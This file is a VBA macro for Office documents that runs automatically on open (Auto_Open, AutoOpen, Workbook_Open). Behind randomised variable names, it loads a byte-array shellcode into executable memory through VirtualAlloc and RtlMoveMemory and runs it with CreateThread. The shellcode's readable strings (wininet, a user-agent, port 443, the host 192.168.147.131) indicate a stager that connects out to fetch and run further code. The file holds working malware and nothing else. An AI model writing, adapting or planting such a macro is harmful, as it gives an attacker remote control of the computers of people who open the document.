#If Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Ssbtkofl As Long, ByVal Phof As Long, ByVal Aeozso As LongPtr, Bmlfcwbvx As Long, ByVal Uoxixi As Long, Cvdbp As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Veqy As Long, ByVal Mtnjkwe As Long, ByVal Ymma As Long, ByVal Xbpvefzc As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Bgshxyk As LongPtr, ByRef Wqsmjzvw As Any, ByVal Jsdmpooot As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Ssbtkofl As Long, ByVal Phof As Long, ByVal Aeozso As Long, Bmlfcwbvx As Long, ByVal Uoxixi As Long, Cvdbp As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Veqy As Long, ByVal Mtnjkwe As Long, ByVal Ymma As Long, ByVal Xbpvefzc As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Bgshxyk As Long, ByRef Wqsmjzvw As Any, ByVal Jsdmpooot As Long) As Long
#EndIf

Sub Auto_Open()
        Dim Ttjcnbdf As Long, Dphmap As Variant, Rvtdwy As Long
#If Vba7 Then
        Dim  Wfg As LongPtr, Inl As LongPtr
#Else
        Dim  Wfg As Long, Inl As Long
#EndIf
        Dphmap = Array(232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,49,255,139,114,40,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,88,32,139,72,24,1,211,133,201,116,60,49,255, _
73,139,52,139,1,214,49,192,193,207,13,172,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,62,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32,108,105,107,101,32,71,101,99,107,111, _
0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,237,0,0,0,47,77,50,71,122,66,116,48,98,83,111,54,48,101,98,86,52,49,107,110,85,111,119,122,87,115,90,108,52,84,54,120,83,75,69,105,118,81,101,76,108,78,99,90,97,85,52,113,110,104,89,107,112,88,75,101, _
70,108,98,119,68,112,103,78,71,88,85,51,73,77,57,101,86,83,99,55,115,118,81,81,55,71,120,75,56,86,87,89,106,121,76,48,51,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4, _
80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,76,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86, _
104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,49,52,55,46,49,51,49,0,187,240,181,162,86,106,0,83,255,213)

        Wfg = VirtualAlloc(0, UBound(Dphmap), &H1000, &H40)
        For Rvtdwy = LBound(Dphmap) To UBound(Dphmap)
                Ttjcnbdf = Dphmap(Rvtdwy)
                Inl = RtlMoveMemory(Wfg + Rvtdwy, Ttjcnbdf, 1)
        Next Rvtdwy
        Inl = CreateThread(0, 0, Wfg, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
